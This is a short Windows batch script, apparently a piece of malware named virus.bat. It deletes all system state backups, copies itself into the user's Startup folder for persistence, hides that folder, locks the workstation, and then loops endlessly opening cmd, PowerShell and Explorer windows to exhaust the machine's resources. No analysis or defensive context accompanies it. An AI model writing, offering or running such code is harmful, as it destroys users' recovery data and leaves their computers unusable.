@echo off
wbadmin delete systemstatebackup -keepVersions:0
echo %USERNAME%
@echo off
for /r C:\ %%f in (virus.bat) do (
    move "%%f" "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
    attrib +h +s "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
    rundll32.exe user32.dll,LockWorkStation
)

:a
start cmd
start powershell
start explorer
goto a
